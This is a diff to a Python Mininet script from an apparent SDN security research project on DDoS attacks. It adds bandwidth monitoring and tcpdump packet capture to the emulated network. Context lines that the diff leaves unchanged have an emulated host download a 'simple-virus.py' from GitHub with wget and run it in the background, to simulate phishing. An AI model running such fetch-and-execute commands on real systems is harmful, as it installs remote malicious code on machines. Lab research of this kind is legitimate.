@@ -1,3 +1,5 @@
+from subprocess import Popen
+
 from mininet.net import Mininet
 from mininet.node import Controller, OVSSwitch
 from mininet.link import TCLink
@@ -67,6 +69,24 @@ def create_network():
     # Simulate phishing on h4
     h4.cmd('wget https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/simple-virus.py -O virus.py')
     h4.cmd('python virus.py &')
+
+    # Start Monitoring
+    Popen("bwm-ng -o csv -T rate -C ',' > /tmp/mon &", shell=True).wait()
+
+    # Start Capturing
+    for i in range(1, 4):
+        for j in range(1, 3):
+            Popen(f"tcpdump -i s{i}-eth{j} -w /tmp/s{i}-eth{j}.pcap &", shell=True).wait()
+
+    input("Press Enter to stop the network...")
+
+    # Stop the capturing
+    Popen("killall tcpdump", shell=True).wait()
+    # Stop the monitoring
+    Popen("killall bwm-ng", shell=True).wait()
+
+    # Stop the network
+    net.stop()
 
 
 if __name__ == '__main__':
